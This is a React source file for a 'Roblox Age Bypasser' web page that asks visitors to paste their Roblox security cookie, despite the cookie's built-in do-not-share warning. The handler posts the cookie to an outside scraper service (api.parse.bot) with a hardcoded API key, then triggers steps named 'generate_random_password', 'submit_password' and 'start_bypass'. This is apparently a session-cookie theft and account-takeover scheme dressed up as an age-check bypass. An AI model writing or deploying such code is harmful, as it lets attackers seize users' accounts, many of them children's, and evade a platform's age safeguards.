import React, { useEffect, useState } from 'react';
import { ShieldCheck, Loader2, Check, AlertCircle } from 'lucide-react';

// Custom SVG component mimicking the Jolteon Shield Logo
const JolteonLogo = ({ className, size = 42 }: { className?: string; size?: number }) => (
  <svg
    width={size}
    height={size}
    viewBox="0 0 100 100"
    className={className}
    fill="currentColor"
    xmlns="http://www.w3.org/2000/svg"
  >
    {/* Background Triangle Corners */}
    <path d="M10 10 L40 10 L30 20 L20 20 L20 30 L10 40 Z" fill="currentColor" />
    <path d="M90 10 L60 10 L70 20 L80 20 L80 30 L90 40 Z" fill="currentColor" />
    <path d="M50 95 L30 65 L40 65 L50 80 L60 65 L70 65 Z" fill="currentColor" />
    
    {/* Spiky Electric Head */}
    <path 
      d="M50 25 
         L58 40 L70 35 L65 48 L80 50 L65 62 L75 80 
         L58 70 L50 85 L42 70 L25 80 L35 62 L20 50 
         L35 48 L30 35 L42 40 Z" 
      fill="currentColor" 
    />
    
    {/* Eyes */}
    <path d="M40 55 Q42 60 45 55" stroke="#0f1014" strokeWidth="3" fill="none" />
    <path d="M55 55 Q58 60 60 55" stroke="#0f1014" strokeWidth="3" fill="none" />
  </svg>
);

const DiscordIcon = ({ size = 20, className }: { size?: number; className?: string }) => (
  <svg 
    width={size} 
    height={size} 
    viewBox="0 0 24 24" 
    fill="currentColor" 
    className={className}
    xmlns="http://www.w3.org/2000/svg"
  >
    <path d="M20.317 4.3698a19.7913 19.7913 0 0 0-4.8851-1.5152.0741.0741 0 0 0-.0785.0371c-.211.3753-.4447.8648-.6083 1.2495-1.8447-.2762-3.68-.2762-5.4868 0-.1636-.3933-.4058-.8742-.6177-1.2495a.077.077 0 0 0-.0785-.037 19.7363 19.7363 0 0 0-4.8852 1.515.0699.0699 0 0 0-.0321.0277C.5334 9.0458-.319 13.5799.0992 18.0578a.0824.0824 0 0 0 .0312.0561c2.0528 1.5076 4.0413 2.4228 5.9929 3.0294a.0777.0777 0 0 0 .0842-.0276c.4616-.6304.8731-1.2952 1.226-1.9942a.076.076 0 0 0-.0416-.1057c-.6528-.2476-1.2743-.5495-1.8722-.8923a.077.077 0 0 1-.0076-.1277c.1258-.0943.2517-.1923.3718-.2914a.0743.0743 0 0 1 .0776-.0105c3.9278 1.7933 8.18 1.7933 12.0614 0a.0739.0739 0 0 1 .0785.0095c.1202.099.246.1981.3728.2924a.077.077 0 0 1-.0066.1276 12.2986 12.2986 0 0 1-1.873.8914.0766.0766 0 0 0-.0407.1067c.3604.698.7719 1.3628 1.225 1.9932a.076.076 0 0 0 .0842.0286c1.961-.6067 3.9495-1.5219 6.0023-3.0294a.077.077 0 0 0 .0313-.0552c.5004-5.177-.8382-9.6739-3.5485-13.6604a.061.061 0 0 0-.0312-.0286zM8.02 15.3312c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9555-2.4189 2.157-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.946 2.419-2.1568 2.419zm7.9748 0c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9554-2.4189 2.1569-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.946 2.419-2.1568 2.419z"/>
  </svg>
);

const Snowfall = () => {
  const [snowflakes, setSnowflakes] = useState<Array<{ id: number; left: number; duration: number; delay: number; size: number }>>([]);

  useEffect(() => {
    // Generate static random values for snowflakes on mount to avoid hydration mismatch/re-renders
    const flakes = Array.from({ length: 50 }).map((_, i) => ({
      id: i,
      left: Math.random() * 100,
      duration: Math.random() * 3 + 4, // 4-7 seconds
      delay: Math.random() * 5,
      size: Math.random() * 3 + 2,
    }));
    setSnowflakes(flakes);
  }, []);

  return (
    <div className="fixed inset-0 pointer-events-none z-0 overflow-hidden" aria-hidden="true">
      <style>
        {`
          @keyframes fall {
            0% { transform: translateY(-10vh) translateX(-5px); opacity: 0; }
            10% { opacity: 0.8; }
            100% { transform: translateY(110vh) translateX(5px); opacity: 0; }
          }
        `}
      </style>
      {snowflakes.map((flake) => (
        <div
          key={flake.id}
          className="absolute bg-white rounded-full opacity-60"
          style={{
            left: `${flake.left}%`,
            top: `-20px`,
            width: `${flake.size}px`,
            height: `${flake.size}px`,
            animation: `fall ${flake.duration}s linear infinite`,
            animationDelay: `${flake.delay}s`,
          }}
        />
      ))}
    </div>
  );
};

const App: React.FC = () => {
  const [cookie, setCookie] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [isDone, setIsDone] = useState(false);
  const [error, setError] = useState('');

  const handleBypass = async () => {
    setError(''); // Clear previous errors

    // Validation: Empty check
    if (!cookie.trim()) {
      setError('Please enter your Roblox security cookie.');
      return;
    }

    // Validation: Format check (Warning string and length)
    // Standard Roblox cookies start with _|WARNING:-DO-NOT-SHARE-THIS
    if (!cookie.includes('_|WARNING:-DO-NOT-SHARE-THIS') || cookie.length < 50) {
      setError('Invalid cookie detected. Ensure it starts with "_|WARNING:-DO-NOT-SHARE-THIS" and is complete.');
      return;
    }
    
    setIsProcessing(true);
    setIsDone(false);

    // API Configuration
    const API_KEY = "58a549e8-6e14-4c73-9a18-be183aa5d419";
    const SCRAPER_ID = "651efe3e-b795-427b-a14d-b32b24b927ee";
    const BASE_URL = `https://api.parse.bot/scraper/${SCRAPER_ID}`;
    const HEADERS = {
        "Content-Type": "application/json",
        "X-API-Key": API_KEY
    };

    try {
      // Helper function to handle API calls
      const makeRequest = async (endpoint: string, body: any) => {
        const response = await fetch(`${BASE_URL}/${endpoint}`, {
          method: 'POST',
          headers: HEADERS,
          body: JSON.stringify(body)
        });

        const data = await response.json().catch(() => ({}));
        
        if (!response.ok) {
          throw new Error(data.message || data.error || `Error ${response.status}: ${response.statusText}`);
        }
        return data;
      };

      // Step 1: Set Session Cookie
      await makeRequest('set_session_cookie', { cookie_value: cookie });

      // Step 2: Generate Random Password
      const genPassData = await makeRequest('generate_random_password', {});
      const password = genPassData.password;

      if (!password) {
        throw new Error("Failed to generate password from server.");
      }

      // Step 3: Submit Password
      await makeRequest('submit_password', { password });

      // Step 4: Start Bypass
      await makeRequest('start_bypass', {});

      setIsDone(true);
    } catch (err: any) {
      console.error(err);
      setError(err.message || "An unexpected connection error occurred.");
    } finally {
      setIsProcessing(false);
    }
  };

  const handleCookieChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setCookie(e.target.value);
    if (error) setError(''); // Clear error when typing
    if (isDone) setIsDone(false); // Reset done status if user changes input
  };

  return (
    <div className="min-h-screen w-full bg-[#0a0a0a] text-white flex flex-col items-center justify-center font-sans p-4 md:p-6 selection:bg-yellow-500/30 relative overflow-hidden">
      
      {/* Background Effects */}
      <Snowfall />

      {/* Top Right Area: Credits & Discord */}
      <div className="absolute top-4 right-4 md:top-6 md:right-6 z-50 flex items-center gap-3">
        <span className="text-zinc-500/50 text-[10px] sm:text-xs font-medium tracking-widest uppercase hidden sm:block pointer-events-none select-none">
          made by rror12
        </span>
        <a 
          href="https://discord.gg/zH99nXxCrg" 
          target="_blank" 
          rel="noopener noreferrer" 
          className="text-zinc-400 hover:text-[#5865F2] transition-colors flex items-center gap-2 text-sm font-medium group"
        >
          <span className="hidden sm:inline opacity-0 group-hover:opacity-100 transition-opacity -translate-x-2 group-hover:translate-x-0 duration-300">Join Discord</span>
          <div className="bg-[#111] p-2 rounded-full border border-zinc-800 group-hover:border-[#5865F2]/50 transition-colors">
            <DiscordIcon size={20} />
          </div>
        </a>
      </div>
      
      {/* Scrollable container for smaller height screens */}
      <div className="w-full max-w-lg flex flex-col items-center justify-center my-auto py-8 z-10">

        {/* Top Icon Area */}
        <div className="mb-6 md:mb-8 relative flex items-center justify-center">
          {/* Glow effect */}
          <div className="absolute w-20 h-20 md:w-24 md:h-24 bg-yellow-500/20 blur-3xl rounded-full"></div>
          {/* Icon container */}
          <div className="relative bg-[#0f1014] p-4 md:p-5 rounded-2xl border border-yellow-500/20 shadow-2xl shadow-yellow-500/10 rotate-3 transition-transform hover:rotate-6 hover:scale-105 duration-300">
             <JolteonLogo size={42} className="text-yellow-400 drop-shadow-[0_0_15px_rgba(250,204,21,0.5)]" />
          </div>
        </div>

        {/* Headings */}
        <div className="text-center mb-10 space-y-2 px-4">
          <h1 className="text-3xl sm:text-4xl md:text-5xl font-bold tracking-tight text-white leading-tight">
            Roblox Age Bypasser
          </h1>
          <p className="text-yellow-400 text-sm font-bold tracking-widest uppercase drop-shadow-sm">
            Created by Sonic
          </p>
        </div>

        {/* Main Card (The Box) - Yellow Border/Theme */}
        <div className="w-full bg-[#111111]/95 backdrop-blur-sm border-2 border-yellow-500 rounded-xl p-6 md:p-8 shadow-[0_0_25px_rgba(234,179,8,0.15)] relative">
          
          {/* Input Field */}
          <div className="space-y-3 mb-6 md:mb-8">
            <label className="text-sm font-semibold text-zinc-300 block ml-1">
              Cookie
            </label>
            <div className="relative">
              <input 
                type="text" 
                value={cookie}
                onChange={handleCookieChange}
                placeholder="_|WARNING:-DO-NOT-SHARE-THIS..."
                className={`
                  w-full bg-[#161616] border rounded-lg px-4 py-3.5 text-zinc-300 placeholder-zinc-600 focus:outline-none focus:ring-1 transition-all font-mono text-base md:text-sm shadow-inner disabled:opacity-50 disabled:cursor-not-allowed
                  ${error 
                    ? 'border-red-500/50 focus:border-red-500 focus:ring-red-500/20' 
                    : 'border-zinc-800 focus:border-yellow-500 focus:ring-yellow-500'}
                `}
                spellCheck={false}
                disabled={isProcessing}
              />
            </div>
            {/* Inline Error Message */}
            {error && (
              <div className="flex items-center gap-2 text-red-400 text-xs ml-1 mt-2 animate-in fade-in slide-in-from-top-1 duration-200">
                <AlertCircle size={14} className="shrink-0" />
                <span>{error}</span>
              </div>
            )}
          </div>

          {/* Action Button - Dark Yellow */}
          <button 
            onClick={handleBypass}
            disabled={isProcessing}
            className={`
              w-full font-bold py-3.5 rounded-lg transition-all 
              shadow-[0_4px_14px_0_rgba(202,138,4,0.39)] hover:shadow-[0_6px_20px_rgba(234,179,8,0.23)] 
              flex items-center justify-center gap-2 active:scale-[0.98]
              ${isProcessing ? 'bg-yellow-600 opacity-70 cursor-not-allowed hover:shadow-none active:scale-100' : ''}
              ${isDone && !isProcessing ? 'bg-green-600 hover:bg-green-500 shadow-[0_4px_14px_0_rgba(22,163,74,0.39)] hover:shadow-[0_6px_20px_rgba(34,197,94,0.23)]' : 'bg-yellow-600 hover:bg-yellow-500 active:bg-yellow-700'}
            `}
          >
            {isProcessing ? (
              <>
                <Loader2 size={18} className="animate-spin text-white/90" />
                <span className="text-white">Processing...</span>
              </>
            ) : isDone ? (
              <>
                <Check size={18} className="text-white/90" />
                <span className="text-white">Done Bypassing</span>
              </>
            ) : (
              <>
                <ShieldCheck size={18} className="text-white/90" />
                <span className="text-white">Start Bypass</span>
              </>
            )}
          </button>

        </div>

        {/* Footer */}
        <div className="mt-12 md:mt-16 text-zinc-600 text-[10px] md:text-xs font-medium tracking-wide text-center uppercase opacity-80">
          Secure · Automated · Real-time Bypassing
        </div>

      </div>
    </div>
  );
};

export default App;